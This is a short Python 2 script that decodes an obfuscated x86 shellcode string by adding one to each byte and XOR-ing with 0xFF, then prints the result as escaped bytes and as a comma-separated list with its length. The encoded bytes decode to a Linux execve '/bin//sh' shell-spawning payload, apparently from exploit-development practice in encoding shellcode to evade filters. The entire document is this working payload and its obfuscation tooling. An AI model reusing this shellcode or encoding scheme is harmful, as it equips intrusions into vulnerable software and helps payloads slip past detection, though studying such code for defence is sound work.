#!/usr/bin/python
import math

shellcode = ("\xcd\x3e\xae\x96\x90\xcf\x8b\x96\x96\xcf\xcf\x9c\x95\x75\x1b\xae\x75\x1c\xab\x75\x1d\x4e\xf3\x31\x7e")

decoded = ""
decoded2 = ""

for x in bytearray(shellcode) :
        dec1 = x + 0x1
	dec2 = dec1 ^ 0xFF
        decoded += '\\x'
        decoded += '%02x' %dec2


        decoded2 += '0x'
        decoded2 += '%02x,' %dec2
        
print decoded
print "\n"
print decoded2
print 'Shellcode lenght: %d' % len(bytearray(shellcode))
